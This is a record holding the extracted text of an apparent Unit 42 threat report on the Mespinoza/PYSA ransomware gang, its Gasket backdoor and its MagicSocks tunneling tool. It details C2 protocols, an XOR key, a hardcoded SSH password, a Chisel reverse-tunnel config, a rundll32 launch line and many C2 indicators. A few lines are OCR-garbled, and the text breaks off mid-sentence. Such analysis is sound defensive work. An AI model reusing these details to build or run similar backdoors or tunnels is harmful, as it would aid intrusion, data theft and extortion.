{
    "id": "2e30168e-4adf-4875-a851-988e32859e5d",
    "created_at": "2023-01-12T15:02:30.986562Z",
    "updated_at": "2025-03-27T02:06:12.835691Z",
    "deleted_at": null,
    "sha1_hash": "2954a98f5be97efce655050057bcaec59c52e985",
    "title": "2021-07-15 - Mespinoza Ransomware Gang Calls Victims “Partners,” Attacks with Gasket, -MagicSocks- Tools",
    "authors": "",
    "file_creation_date": "2022-05-28T00:36:30Z",
    "file_modification_date": "2022-05-28T00:36:30Z",
    "file_size": 4131231,
    "plain_text": "# Mespinoza Ransomware Gang Calls Victims “Partners,” Attacks with Gasket, \"MagicSocks\" Tools\n\n**[unit42.paloaltonetworks.com/gasket-and-magicsocks-tools-install-mespinoza-ransomware/](https://unit42.paloaltonetworks.com/gasket-and-magicsocks-tools-install-mespinoza-ransomware/)**\n\nRobert Falcone, Alex Hinchliffe, Quinn Cooke July 15, 2021\n\nBy [Robert Falcone,](https://unit42.paloaltonetworks.com/author/robertfalcone/) [Alex Hinchliffe and](https://unit42.paloaltonetworks.com/author/alex-hinchliffe/) [Quinn Cooke](https://unit42.paloaltonetworks.com/author/quinn-cooke/)\n\nJuly 15, 2021 at 3:00 AM\n\n[Category: Ransomware,](https://unit42.paloaltonetworks.com/category/ransomware/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [Mespinoza ransomware](https://unit42.paloaltonetworks.com/tag/mespinoza-ransomware/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/gasket-and-magicsocks-tools-install-mespinoza-ransomware/)\n\n## Executive Summary\n\nAs cyber extortion flourishes, ransomware gangs are constantly changing tactics and business models to increase the chances that victims will\npay increasingly large ransoms. As these criminal organizations become more sophisticated, they are increasingly taking on the appearance of\nprofessional enterprises. One good example is Mespinoza ransomware, which is run by a prolific group with a penchant for using whimsical\nterms to name its hacking tools.\n\nOur Unit 42 cybersecurity consultants have observed the gang attacking U.S. publishing, real estate, industrial manufacturing and education\n[organizations with ransom demands as high as $1.6 million and payments as high as $470,000. The FBI recently published an alert about the](https://www.ic3.gov/Media/News/2021/210316.pdf)\ngroup, also known as PYSA, following a hacking spree on K-12 schools, colleges, universities and even seminaries in the United States, as\nwell as the United Kingdom.\n\nTo learn more about this group, we monitored its infrastructure — including a command and control (C2) server it uses to manage attacks and\na leak site where it posts data of victims who refused to pay large ransoms. Here are some our our key findings on the Mespinoza gang:\n\n**Extremely Disciplined: After accessing a new network, the group studies compromised systems in what we believe is triage to determine**\nwhether there’s enough valuable data to justify launching a full-scale attack. They look for keywords including clandestine, fraud, ssn,\ndriver*license, passport and I-9. That suggests they are hunting for sensitive files that would have the most impact if leaked.\n\n**Targets Many Industries: Victim organizations are referred to as “partners.” Use of that term suggests that they try to run the group as a**\nprofessional enterprise and see victims as business partners who fund their profits. The gang’s leak site provided data it claims belong to 187\nvictim organizations in industries including education, manufacturing, retail, medical, government, high tech, transportation and logistics,\nengineering and social services, among others.\n\n**Has Global Reach: 55 percent of victims identified on the leak site are in the United States. The rest are scattered across the globe in more**\nthan 20 countries including Canada, Brazil, United Kingdom, Italy, Spain, France, Germany, South Africa and Australia.\n\n\n-----\n\n**s Coc y** **e** **pp oac** **g** **ct** **s** a so ote o e s t s ad ce at to te y boss otect ou Syste, go\n\n**Uses Attack Tools with Creative Names: A tool that creates network tunnels to siphon off data is called “MagicSocks.” A component stored**\non their staging server and likely used to wrap up an attack is named “HappyEnd.bat.”\n\n[Palo Alto Networks Next-Generation Firewall customers are protected from this threat with](https://www.paloaltonetworks.com/network-security/next-generation-firewall) [DNS Security,](https://www.paloaltonetworks.com/network-security/dns-security.html) [Threat Prevention,](https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/threat-prevention) Advanced URL\nFiltering and [WildFire security subscriptions. Customers are also protected with Cortex XDR and can use](https://www.paloaltonetworks.com/products/secure-the-network/wildfire) [AutoFocus for tracking related](https://www.paloaltonetworks.com/cortex/autofocus)\nentities. [Cortex Xpanse customers can assess and manage their network security attack surface and inventory their systems. Full visualization](https://www.paloaltonetworks.com/cortex/cortex-xpanse)\n[of the techniques observed and their relevant courses of action can be viewed in the Unit 42 ATOM Viewer.](https://unit42.paloaltonetworks.com/atoms/mespinoza-ransomware/)\n\n## Accessing Networks via RDP\n\nWe’ve responded to incidents where the ransomware operators use Remote Desktop Protocol (RDP) to access the impacted organization’s\nnetwork and make use of various open-source and built-in system tools to aid lateral movement and credential gathering. The operators\nleverage double-extortion tactics — exfiltrating data prior to deploying the ransomware so they can later threaten to leak it — and install a new\nbackdoor, we call Gasket, (based on the malware’s code) to maintain access to the network. Gasket also references a capability called\n[“MagicSocks,” which uses the open-source Chisel project to create tunnels for continued remote access to the network.](https://github.com/jpillora/chisel)\n\nWe’ve observed the Mespinoza ransomware gang exfiltrating files to a remote server whose filenames match a list of keywords prior to\ninstalling the ransomware via a PowerShell script. The keywords include the sub-strings “secret,” “fraud” and “SWIFT.”, which suggests the\nactors sought to gather and exfiltrate sensitive files that would have the most impact on the organization if the actors released the files to the\npublic. At the time of this writing, the gang’s leak site named and provided information on 187 organizations in various industries globally.\n\nFigure 1. Mespinoza victimology by country.\n\n\n-----\n\nFigure 2. Mespinoza victimology by industry.\nIn many of the descriptions, the actor refers to the impacted organization as their “partner.” We suspect that Mespinoza uses the term because\nthey view their operations as a professional enterprise and their “partners” as business partners funding their business.\n\nThe Gasket and MagicSocks tools, as well as the exfiltrated data on the leaked site, date back to April 2020, which suggests the Mespinoza\nransomware gang has been active for more than a year. While there are reports suggesting that the Mespinoza ransomware gang has adopted\na Ransomware-as-a-Service (RaaS) model, we have not observed this behavior from the group based on the ransomware cases we’ve\ninvestigated.\n\n## Gasket\n\nDuring our analysis of a Mespinoza ransomware incident, we observed the threat actors installing a backdoor written in the Go language on\n[the system prior to the distribution of the ransomware. According to a report published by France’s National Agency for the Security of](https://www.cert.ssi.gouv.fr/uploads/CERTFR-2020-CTI-003.pdf)\nInformation Systems (ANSSI), ANSSI also observed threat actors delivering the Mespinoza ransomware using a payload written in Go. We\nanalyzed the Go sample mentioned in the ANSSI report and found that it was an earlier and an unobfuscated version of the same tool we\nobserved in our case.\n\n[The developers of Gasket wrote this backdoor in Golang and used the open-source Gobfuscate tool to obfuscate the payload. We call this tool](https://github.com/unixpickle/gobfuscate)\nGasket, as the variant of this tool mentioned in the ANSSI report (SHA256:\n9986b6881fc1df8f119a6ed693a7858c606aed291b0b2f2b3d9ed866337bdbde) designated as version “001,” which had the following two\nfunctions that it called to carry out its command and control (c2) communications:\n\nmain.checkGasket\n\nmain.connectGasket\n\nWe believe that the actors use this backdoor as a backup to RDP to maintain access to the network.\n\nGasket parses the command line arguments passed to it to determine whether it should run as a standalone process (no daemon mode),\ninstall itself as a service (daemon mode, no command line arguments) or to control a previously installed Gasket service. Gasket supports the\nfollowing command line arguments:\n\nno-persist\n\nservice Restart|Install|Start|Run\n\nWhen attempting to install itself as a daemon, Gasket will create a service and run its functional code. The following service names have been\nextracted from the known Gasket samples:\n\n\n-----\n\nu e ge tCo t o e\n\nCorpNativeHostDebugger\n\nDefenderSecurityAgent\n\nGetServiceController\n\nJavaJDBC\n\nMicrosoftSecurityManager\n\nMicrosoftTeamConnect\n\nMicrosoftTeamConnectDebugger\n\nMicrosoftTeamManager\n\nMsStudioAgentUpdateService\n\nWindowsHealthSubSystem\n\nWindowsManagementSystem\n\nWindowsProtectionSystem\n\nWindowsSoftwareManager\n\nWindowsSoftwareManagerDebugger\n\n## Command and Control\n\nA majority of versions of Gasket come equipped with a primary C2 communication channel, as well as a second fallback channel. Early\nversions of Gasket relied only on HTTP-based C2 communications using IP addresses for its servers, while later versions use the same HTTPbased C2 channel as a fallback and rely mainly on a DNS tunneling C2 channel. The DNS tunneling protocol uses DNS TXT queries and is\n[based on an open source project called Chashell. For instance, the following DNS TXT query was issued by Gasket:](https://github.com/sysdream/chashell)\n\n98ca192722ba28e9b8fb34b0d789a00608a13aac2e8d5b420b8e2ae899777a4.5c91a5a50ca31d47ed0d1dbbd0b7d0633b8f80d00eae16b6b1e6e3\n\nTo understand the outbound DNS queries issued by Gasket, we analyzed Chashell’s server to determine how it processes the inbound DNS\nqueries and to understand how the server constructs its responses. The Chashell C2 server will take the subdomain up to the fully qualified\ndomain name for the C2 (transnet[.]wiki from above) and join the subdomain labels together without the periods removed. The server then\ndecrypts the resulting data using XSalsa20 and Poly1305, of which the cleartext is treated as a serialized protobuf message. All Gasket\nsamples that use the DNS tunneling C2 channel-based on Chashell use a unique key of\n37c3cb07b37d43721b3a8171959d2dff11ff904b048a334012239be9c7b87f63 to decrypt the data transferred.\n\nAccording to [Chashell's GitHub, the chacomm.proto file describes the protobuf message structure that the server will use to parse the](https://github.com/sysdream/chashell/blob/master/proto/chacomm.proto)\ndecrypted data received by Gasket and how it will structure its response. The structure of the message includes a clientguid field that is a\nGUID unique to the compromised host and either a ChunkStart, ChunkData, PollQuery or InfoPacket packet type. The structure of each packet\ntype varies, but the following table describes each packet type's purpose:\n\n**Packet Type** **Description**\n\nInfoPacket Initial beacon that provides the compromised system's hostname to the C2.\n\nChunkStart Provides a chunk identifier and tells the C2 how many DNS queries will be required to send the data.\n\nChunkData Includes the chunk identifier, the current chunk and the data, so the C2 can reconstruct the uploaded data.\n\nPollQuery Acts as a heartbeat to keep the session alive, but is also used as the query type to get data from the C2.\n\nTable 1. Description of Chashell's different packet types.\n\nThe C2 will respond to these queries with hexadecimal formatted data within the TXT answer, which is a serialized protobuf that uses the same\nmessage structure from Chashell’s chacomm.proto file. The following example shows the DNS requests and responses and the contents of\nthe messages necessary to send data from the Chashell server to the Gasket payload via the DNS tunneling C2 channel:\n\n\n-----\n\nFigure 3. Example DNS request and response flow of Chashell.\nUnfortunately, Gasket would not run the hostname data provided via the Chashell server above as a command, as there’s a sub-protocol and a\ncommand handler used by Gasket to determine how to handle the server’s response, which we will discuss in the next section. Gasket also\nuses a sub-protocol in addition to Chashell's DNS tunneling protocol for its DNS requests, which prepends a message type followed by\nencrypted data to notify the C2 of the type of message. This suggests that the actors had modified the Chashell server code to support this\nmodified communication channel. The following message types are available:\n\n**Message Type** **Description**\n\n1 Initial check-in structured as <version number>///<encoded computer and user name>///<computer name>///<user name>\n\n2 Heart-beat <version number>///<encoded computer and user name>\n\n9 Data sent including output and debug messages\n\nTable 2. Description of Chashell's different packet types.\n\nAs previously mentioned, many Gasket versions also have an HTTP-based backup C2 channel that it will use if the domains used in the DNS\ntunneling channel are inaccessible. The payload will issue HTTP requests directly to IP addresses, which does not require any DNS requests\nto operate. To support this backup channel, the payload includes a list of IP addresses that it has hardcoded into a four two-byte binary format\nthat the payload decodes by subtracting 10 from each two-byte and uses the result to create the dot notation IP address. For instance, the\nbytes 37 00 9D 00 EF 00 27 00 in the binary would result in a list of 0x37, 0x9d, 0xef and 0x27, each of which have 10 subtracted from them to\nproduce 0x2d, 0x93, 0xe5 and 0x1d, which results in 45, 147, 229 and 29. These values are then joined with a \".\" character to make the dot\nnotation IP of 45.147.229[.]29. A full list of known HTTP-based Gasket C2 servers is available in Table 5, as well as the Indicators of\nCompromise (IOCs) section of this blog.\n\nThe initial beacon sent via the HTTP C2 channel involves a POST request to the URL /cert/trust. The POST request uses the default Go-httpclient/1.1 user-agent and includes encrypted data that will look like the following:\n\nFigure 4. Example Gasket initial beacon communication.\nThe data in the HTTP POST requests are encrypted with a rolling XOR algorithm, using the string dick as a key. The data within the initial\nbeacon to /cert/trust contains a hardcoded version number 021, a unique identifier for the system (MD5 hash or base64 encoded string), the\ncomputer name and user name delimited by /// as seen in the following:\n\n021///15c50b724a801417ef4143bb58b7178b///<computer name>///<user name>\n\n\n-----\n\nte t e t a beaco, Gas et se ds supp e e ta equests to a U o /t e/sy c to obta co a ds o t e t eat acto, c oo\nlike the following:\n\nFigure 5.\n\nExample Gasket supplemental requests.\nThese follow up requests to /time/sync use the same XOR algorithm and key and the resulting data includes just the first two fields,\nspecifically:\n\n021///15c50b724a801417ef4143bb58b7178b\n\nFor versions that have remote logging capabilities, Gasket sends HTTP POST requests to a URL of /cert/dist that looks like the following:\n\nFigure 6. Example Gasket remote logging requests.\nThe remote logging request seen above uses the same XOR algorithm and key as in other HTTP requests. The structure of the data differs\nslightly with the sent information, including the version number, the unique identifier for the system and finally the message sent to the server\nas seen in the following example remote error log:\n\n002///<base64 username+computername>///[Control]: Failed to Stop Windows Protection System: Unknown action Stop\n\n## Capabilities\n\nThe response from the C2 server will provide /// delimited data that contains an integer that the payload will treat as a command, along with\nadditional parameters for the commands. Table 3 below provides a list of available commands within a majority of and the most recent (021)\nGasket versions.\n\n**Command** **Description**\n\n1 Runs a command/application/powershell with os.exec.Command.Run, returns stdout.\n\n2 Starts a SOCKS5 server using the rsocks project (https://github.com/brimstone/rsocks) to connect to a specified remote\nsystem.\n\n3 Same as command 2.\n\n4 Switches the C2 communications from DNS to HTTP or HTTP to DNS, depending on which channel was currently active.\n\n7 Uses the Chisel project to create what it calls a \"MagicSocks\" client to port forward and tunnel traffic to a provided server using\na provided username and 'networkZSA$789ty5' as a password for SSH.\n\n9 Uninstalls the Trojan by deleting the service running the payload, creating %temp%\\del.bat to delete itself and calling os.Exit\n\nTable 3. Commands available in Gasket version 021.\n\n\n-----\n\nased o t e co a ds ab e 3, t appea s t at Gas et se es t e t eat acto s ot o y as a bac doo, but a so p o des tu e g ab t es\nto allow the actor to use Gasket as a means to tunnel traffic through to an externally controlled server. Gasket references \"magicSocks\" within\n[its debug logs when creating its tunnel, which appears to be a tunneling method using the 'chisel' project. We have evidence that this threat](https://github.com/jpillora/chisel)\nactor has a standalone version of this tunneling tool, which we call MagicSocks and will discuss in the next section.\n\n## Evolution of Gasket\n\nWe alluded to several versions of Gasket in previous sections of this blog, but we only referenced 001 and 021 specifically. These two version\nnumbers mark the oldest and newest known version of Gasket, of which we saw first back in April 2020 all the way through March 2021. Table\n4 provides a list of Gasket samples, their respective version number and the first timestamp we have associated with the sample.\n\n**First Seen** **SHA256** **Version**\n\n4/18/2020 b0629dcb1b95b7d7d65e1dad7549057c11b06600c319db494548c88ec690551e 001\n\n5/08/2020 356671767c368e455f2261f7f76d9ee9bd0b522172490845b89281224ab5dbad 001\n\n5/9/2020 a30e605fa404e3fcbfc50cb94482618add30f8d4dbd9b38ed595764760eb2e80 001\n\n5/13/2020 64b9b5874820ca26344c919b518d6c0599a991aaf1943a519da98d294bebf01f 001\n\n5/9/2020 ccfa2c14159a535ff1e5a42c5dcfb2a759a1f4b6a410028fd8b4640b4f7983c1 001\n\n7/23/2020 5d8459c2170c296288e2c0dd9a77f5d973b22213af8fa0d276a8794ffe8dc159 001\n\n10/7/2020 af97b35d9e30db252034129b7b3e4e6584d1268d00cde9654024ce460526f61e 001\n\n5/14/2021 1b888acb22a8326bd5f80f840390182d00e0c8db416d29d042358b48d1220438 001\n\n5/19/2020 0bcbc1faec0c44d157d5c8170be4764f290d34078516da5dcd8b5039ef54f5ca 002\n\n11/23/2020 ea3b35384e803bef3c02a8f27aea2c2a40f9a4d2726113e1c5f2bc3be9c41322 002\n\n8/31/2020 85c8ccf45cdb84e99cce74c376ce73fdf08fdd6d0a7809702e317c18a016b388 003\n\n10/13/2020 8b5cdbd315da292bbbeb9ff4e933c98f0e3de37b5b813e87a6b9796e10fbe9e8 003\n\n6/12/2020 701791cd5ed3e3b137dd121a0458977099bb194a4580f364802914483c72b3ce 006\n\n6/20/2020 ef31b968c71b0e21d9b0674e3200f5a6eb1ebf6700756d4515da7800c2ee6a0f 006\n\n9/04/2020 aa2faf0f41cc1710caf736f9c966bf82528a97631e94c7a5d23eadcbe0a2b586 006\n\n9/04/2020 140224fb7af2d235e9c5c758e8acaee34c912e62fad625442e5ca4102d11e9e7 006\n\n9/06/2020 d9c753b859414e4b38a0841423b159590c47ad580249b0cd3c99a0ecc6644914 006\n\n9/17/2020 d591f43fc34163c9adbcc98f51bb2771223cc78081e98839ca419e6efd711820 006\n\n9/25/2020 f8a5065eb53b1e3ac81748176f43dce1f9e06ea8db1ecfa38c146e8ea89fcc0b 006\n\n7/16/2020 12b927235ab1a5eb87222ef34e88d4aababe23804ae12dc0807ca6b256c7281c 007\n\n9/25/2020 045510eb6c86fc2d966aded8722f4c0e73690b5078771944ec1a842e50af4410 008\n\n10/08/2020 6eb0455b0ab3073c88fcba0cad92f73cc53459f94008e57100dc741c23cf41a3 009\n\n6/22/2020 f5cb94aa3e1a4a8b6d107d12081e0770e95f08a96f0fc4d5214e8226d71e7eb7 010\n\n10/08/2020 2697bbe0e96c801ff615a97c2258ac27eec015077df5222d52f3fbbcdca901f5 010\n\n7/16/2020 30bd30642bf83abd74b8b2312ea606e0f192b0d61351f1445d1a1458414992d3 011\n\n10/14/2020 3a6ddc4022f6abe7bdb95a3ba491aaf7f9713bcb6db1fbaa299f7c68ab04d4f4 011\n\n11/17/2020 c2ef84710937b622f35b2b8fab9f9aa86b718ba7bc77a40b33b92e40747676b5 012\n\n11/28/2020 7b5027bd231d8c62f70141fa4f50098d056009b46fa2fac16183d1321be04768 014\n\n01/07/2021 e47a632bfd08e72d15517170b06c2de140f5f237b2f370e12fbb3ad4ff75f649 016\n\n12/14/2020 8a9205709c6a1e5923c66b63addc1f833461df2c7e26d9176993f14de2a39d5b 018\n\n12/21/2020 6d1fde9a5963a672f5e4b35cc7b8eaa8520d830eb30c67fadf8ab82aeb28b81a 019\n\n3/22/2021 0fd13ece461511fbc129f6584d45fea920200116f41d6097e4dffeb965b19ef4 019\n\n\n-----\n\n3/10/2021 89b9ba56ebe73362ef83e7197f85f6480c1e85384ad0bc2a76505ba97a681010 020\n\n3/23/2021 c9bed25ab291953872c90126ce5283ce1ad5269ff8c1bca74a42468db7417045 021\n\nTable 4. Known Gasket samples and their respective versions.\n\nWe extracted the C2 locations used by Gasket samples for both the HTTP-based and DNS-based channels for analysis. The hardcoded\ndomains and IP addresses, seen in Table 5, are not unique to the version of Gasket, as several domains and IPs were used in Gasket samples\nthat had different version numbers.\n\n**Version** **C2s**\n\n001 185.183.96[.]147\n194.5.249[.]137\n\n194.5.249[.]138\n\n194.5.249[.]139\n\n194.5.250[.]151\n\n194.5.250[.]162\n\n194.5.250[.]216\n\n37.120.140[.]184\n\n37.221.113[.]66\n\naccounting-consult[.]xyz\n\nntservicepack[.]com\n\nstatistics-update[.]xyz\n\n002 185.183.96[.]147\n194.5.250[.]216\n\n194.187.249[.]102\n\n194.187.249[.]138\n\n37.120.140[.]184\n\n37.221.113[.]66\n\n89.38.225[.]208\n\nntservicepack[.]com\n\nreportservicefuture[.]website\n\nsbvjhs[.]xyz\n\nsbvjhs[.]club\n\n\n-----\n\n003 185.186.245[.]85\n193.239.84[.]205\n\n193.239.85[.]55\n\n194.187.249[.]102\n\n194.5.249[.]18\n\n194.5.249[.]180\n\n86.106.20[.]144\n\n89.38.225[.]208\n\nfirefox-search[.]xyz\n\nsbvjhs[.]club\n\nsbvjhs[.]xyz\n\nvisual-translator[.]xyz\n\nwiki-text[.]xyz\n\n006 185.183.96[.]147\n194.187.249[.]102\n\n194.187.249[.]138\n\n194.5.250[.]216\n\n37.120.140[.]184\n\n37.120.140[.]247\n\n37.221.113[.]66\n\n86.106.20[.]144\n\n89.38.225[.]208\n\nntservicepack[.]com\n\nreportservicefuture[.]website\n\nsbvjhs[.]club\n\nsbvjhs[.]xyz\n\n007 ntservicepack[.]com\nreportservicefuture[.]website\n\n37.120.140[.]247\n\n194.5.250[.]216\n\n185.183.96[.]147\n\n008 firefox-search[.]xyz\nvisual-translator[.]xyz\n\nwiki-text[.]xyz\n\n185.186.245[.]85\n\n193.239.85[.]55\n\n193.239.84[.]205\n\n194.187.249[.]102\n\n\n-----\n\n009 firefox-search[.]xyz\nvisual-translator[.]xyz\n\nwiki-text[.]xyz\n\n185.186.245[.]85\n\n193.239.85[.]55\n\n193.239.84[.]205\n\n194.187.249[.]102\n\n010 185.185.27[.]3\n185.186.245[.]85\n\n193.239.84[.]205\n\n193.239.85[.]55\n\n194.187.249[.]102\n\n37.120.145[.]208\n\nblitzz[.]best\n\nfirefox-search[.]xyz\n\nspm[.]best\n\nvisual-translator[.]xyz\n\nwiki-text[.]xyz\n\n011 visual-translator[.]xyz\nfirefox-search[.]xyz\n\nwiki-text[.]xyz\n\nsbvjhs[.]club\n\nspm[.]best\n\nblitzz[.]best\n\n185.186.245[.]85\n\n193.239.85[.]55\n\n193.239.84[.]205\n\n194.187.249[.]102\n\n45.89.175[.]239\n\n185.185.27[.]3\n\n37.120.145[.]208\n\n012 englishdict[.]xyz\n\nserchtext[.]xyz\n\n172.96.189[.]167\n\n89.41.26[.]173\n\n014 englishdict[.]xyz\nserchtext[.]xyz\n\n172.96.189[.]167\n\n89.41.26[.]173\n\n\n-----\n\n016 englishdialoge[.]xyz\nstarhouse[.]xyz\n\n160.20.147[.]184\n\n172.96.189[.]167\n\n193.239.84[.]205\n\n89.41.26[.]173\n\n018 englishdialoge[.]xyz\nstarhouse[.]xyz\n\n160.20.147[.]184\n\n172.96.189[.]167\n\n193.239.84[.]205\n\n89.41.26[.]173\n\n019 english-breakfast[.]xyz\npump-online[.]xyz\n\n172.96.189[.]22\n\n172.96.189[.]246\n\n160.20.147[.]184\n\n172.96.189[.]167\n\n198.252.100[.]37\n\n020 cvar99[.]xyz\ndowax[.]xyz\n\nenglish-breakfast[.]xyz\n\npump-online[.]xyz\n\n45.147.230[.]162\n\n45.147.230[.]212\n\n172.96.189[.]22\n\n172.96.189[.]246\n\n160.20.147[.]184\n\n172.96.189[.]167\n\n198.252.100[.]37\n\n021 transnet[.]wiki\ncvar99[.]xyz\n\nproductoccup[.]tech\n\nccenter[.]tech\n\ndowax[.]xyz\n\n45.147.229[.]29\n\n23.83.133[.]136\n\n45.147.228[.]49\n\n45.147.230[.]162\n\n45.147.230[.]212\n\nTable 5. C2 domains and IP addresses and their associated Gasket version.\n\n\n-----\n\ns p e ous y e t o ed, e a a y ed a y Gas et bac doo s a d ag cSoc s e s o s used by t e t eat acto s a d gat e ed a s g ca t\namount of related infrastructure for blocking and tracking purposes. The Maltego chart in Figure 7 below helps to visualize the Gasket samples\nlisted in Table 5 above, their versions and related infrastructure used for C2 communications. Figure 7 below broadly shows two main clusters.\nOn the left, showing more recent versions (012 to 021) and on the right showing pre-012 versions.\n\nThe vast majority of links between entities shown in Figure 7 are related to infrastructure, namely domain names and IP addresses that\n[respective samples connected to during our WildFire sandbox analysis, or could connect to, based on extracted C2 configuration information.](https://www.paloaltonetworks.com/products/secure-the-network/wildfire)\n\nFigure 7. Maltego diagram showing Gasket and MicroSocks infrastructure and links.\nThe links between some of the distinct clusters (highlighted by squares drawn over Figure 7) are limited and typically involve C2 reuse.\nHowever, some additional links were possible using sample meta-data, such as common Windows Service names, as previously listed.\n\nUsing the heatmap -- Figure 8 below -- we were able to further visualize the amount of reuse and overlap present for the primary C2 address in\nall Gasket samples. Generally speaking, the table shows that earlier versions of Gasket reused C2 addresses the most both for multiple\nvariants of the same version and also for different variants using newer Gasket versions. The heatmap shows later versions -- from about 008\nonwards -- have a reduction in reuse of primary C2 addresses within and across versions, and in the latest versions, it seems primary C2\naddresses are not being reused.\n\n\n-----\n\nFigure 8. Heatmap showing Gasket sample counts and versions against primary C2s.\nThe outliers to this pattern are rows 9, 11 and 12 in Figure 8 above. Rows 9 and 11 relate to the top right cluster in Figure 7 while row 12\nrelates to the bottom right cluster. They are outliers because the Gasket versions are relatively old yet their C2 reuse is nonexistent.\nFurthermore, the links in Figure 7 from the cluster including C2s listed on rows 9 and 11 to the rest of the Gasket mapping lies only with the\nfact that they are known Gasket samples, and they share the same Windows Service name as other samples from other clusters. We believe\nthese outliers could be due to specific campaigns involving Gasket malware with bespoke attack infrastructure.\n\nWe see the most repetitive use of infrastructure in earlier versions of Gasket together with several changes to the name of the Windows\nService created during infection. However, the latest Gasket versions, which appear to adopt more single-use and short-lived infrastructure, (at\nleast for their primary C2s) use a consistent name for the Windows Service, namely JavaJDBC.\n\nFigure 7 also highlights an area of overlap between Gasket and the MagicSocks tool via the common IP address 89.44.9[.]229, which hosted\nboth Gasket (SHA256: aa2faf0f41cc1710caf736f9c966bf82528a97631e94c7a5d23eadcbe0a2b586), the MagicSocks sample (SHA256:\nd49a69be32744e0af32ad622aa22ba480d68253287c99f5a888feb9f2409e46f) and some PowerShell components related to MagicSocks. The\nPowerShell script hashes and additional C2 addresses extracted from other MagicSocks samples are listed in the IOCs section later.\n\n## MagicSocks\n\n[The Gasket tool referenced a proxying and tunneling capability known as MagicSocks, which is based on the open-source Chisel project. The](https://github.com/jpillora/chisel)\nactors also created a standalone version of MagicSocks that they would use in addition to Gasket. The standalone MagicSocks tool comes as\n[a dynamic link library (DLL), which the actor also wrote in Golang. The developer of MagicSocks uses code from the Chisel project to tunnel](https://github.com/jpillora/chisel)\ntraffic from the local system to an external actor-controlled Chisel server. The tool will build the string R:0.0.0.0:50000:socks that it supplies to\nthe Chisel client code that will generate the following JSON that the client uses as a configuration:\n\n{\"Version\":\"0.0.0-src\",\"Remotes\":[{\"LocalHost\":\"0.0.0.0\",\"LocalPort\":\"50000\",\"RemoteHost\":\"\",\"RemotePort\":\"\",\"Socks\":true,\"Reverse\":true}]}\n\nThe tool also builds a string that represents the external actor-controlled Chisel server, which is hosted at:\n\nhttp://creatordampfe[.]xyz:443\n\nWhen running the MagicSocks tool, MagicSocks uses the Chisel client to connect to the Chisel server hosted at creatordampfe[.]xyz. This\nstarts with an HTTP request and response that will look like the following:\n\n\n-----\n\nFigure 9. Example\n\nMagicSocks initial request and response.\n_Figure 9. Example MagicSocks initial request and response._\n\nThe purpose of using Chisel is to tunnel traffic out from the local system to creatordampfe[.]xyz, which acts as a proxy to the true location of\nthe outbound traffic. Unfortunately, we do not have access to the Chisel server at creatordampfe[.]xyz to determine the ultimate destination of\nthe traffic, which highlights the hiding functionality that MagicSocks offers the actors.\n\nWe discovered five additional MagicSocks standalone samples, all compiled between February 2021 and April 2021. We extracted the location\nof the remote Chisel server from each of the five samples and found the following three unique C2 locations:\n\n104.168.164[.]195\n\n172.96.189[.]86\n\n142.79.237[.]163\n\nThese samples were also obfuscated with Gobfuscate, but earlier compiled samples were compiled in the following location, which suggests\nthey were created on a Linux system by a user, named solar:\n\n/home/solar/c/go/magic-dll/src/sokos/\n\nOne of the MagicSocks standalone samples we discovered was delivered with and executed by another tool with a filename of run64.exe\n(SHA256: f2dcad28330f500354eb37f33783af2bcc22d205e9c3805fed5e919c6853649c). This tool does nothing more than run the MagicSocks\nDLL (timex.dll), specifically calling the Debug exported function by running the following rundll32 command:\n\nC:\\Windows\\System32\\rundll32.exe <current directory>\\timex.dll,Debug\n\nWe believe the same individual created this sample as the MagicSocks samples, as the Go project's source was in the following folder that has\nthe same solar username:\n\n/home/solar/c/go/exec-dll/src/\n\nWe found another MagicSocks sample (SHA256: d49a69be32744e0af32ad622aa22ba480d68253287c99f5a888feb9f2409e46f) from\nSeptember 2020, which was not obfuscated with Gobfuscate. This sample was hosted at 89.44.9[.]229/info.txt, which is the same IP that\nhosted the Gasket sample (SHA256: aa2faf0f41cc1710caf736f9c966bf82528a97631e94c7a5d23eadcbe0a2b586). This version of MagicSocks\nuses a [socks5 library to create a proxy to a remote server, specifically 23.227.206[.]158:443. The 89.44.9[.]229 IP hosted other files of interest](https://github.com/armon/go-socks5)\nthat we will discuss further in the related tools section of this blog.\n\n## Mespinoza Ransomware\n\nThe Gasket and MagicSocks tools were used in an attack that delivered the Mespinoza ransomware (also known as PYSA). Additionally,\nbased on analysis during incident response cases worked by Unit 42 consultants, other tools were discovered as used by the operators to\nfacilitate latter parts of their attacks, as described below.\n\n\n-----\n\no ge e a eco a ssa ce o t e et o a te t e b eac, eco as used to e u e ate ct e ecto y o do a s, use s,\ngroups, computers and more. Furthermore, built-in Windows utilities such as quser, ping and net were used, together with downloaded tools\nAdvanced IP Scanner and Advanced Port Scanner, to gather more information about logged-on users and network topologies. PowerShell\nscripts were used to wake up systems turning them on over the network providing the operators with additional targets.\n\nTo gather credentials and facilitate lateral movement, ransomware deployment, the operators used PowerShell to recursively search the file\nsystem for logon credentials stored in text files and spreadsheets. The PowerShell tool \"SessionGopher\", capable of extracting session\ninformation from remote access tools, such as WinSCP, PuTTY, FileZilla and more, was also used enabling RDP and the Microsoft\nSysinternals utility PsExec to allow lateral movement.\n\nThe operators also used PowerShell scripts to kill security services and backups, and disable features of Windows Defender by editing local\ngroup policies.\n\nThe ransomware is fairly straightforward, as it enumerates the file system and encrypts files with an asymmetric cipher, renames the files with\na specific extension and displays a ransom message. The ransom message contains three email addresses that victims would contact to\ndiscuss payment options for the actors to decrypt the encrypted files. In addition to providing email addresses, the ransom message also\nincludes the group’s leak site that the actors say they will post sensitive files that the actors stole from the network prior to encrypting the files.\nIt appears that the group uses these potentially sensitive files to gain leverage in negotiating payment.\n\n## Exfiltration\n\nPrior to deploying Mespinoza, the actors run a PowerShell script that would exfiltrate potentially sensitive files from the compromised network\nas either a double-extortion attempt or to increase leverage in ransom payment negotiations. According to the ransomware’s ransom message\ndisplayed later in this blog, the actors threaten to upload these files to their website or will sell them on the ‘darknet’ if the organization does not\npay the ransom. This message suggests that the actors are using the exfiltrated files as leverage to increase the likelihood of the organization\npaying the ransom.\n\nWe visited the group’s leak site and found that the actors leaked archives of files supposedly exfiltrated from the victim networks. Each leak\nentry on the website includes the name of the organization, a date associated with the leak and a link to either a page hosting the leaked\ninformation or a Zip archive of files. At the time of this writing, 187 organizations were named and the dates of these leaks range from April 3,\n2020 through April 29, 2021. The website also includes a description of the leaked files for 25 of the organizations, which were apparently\nwritten by the actor. In many of the descriptions, the 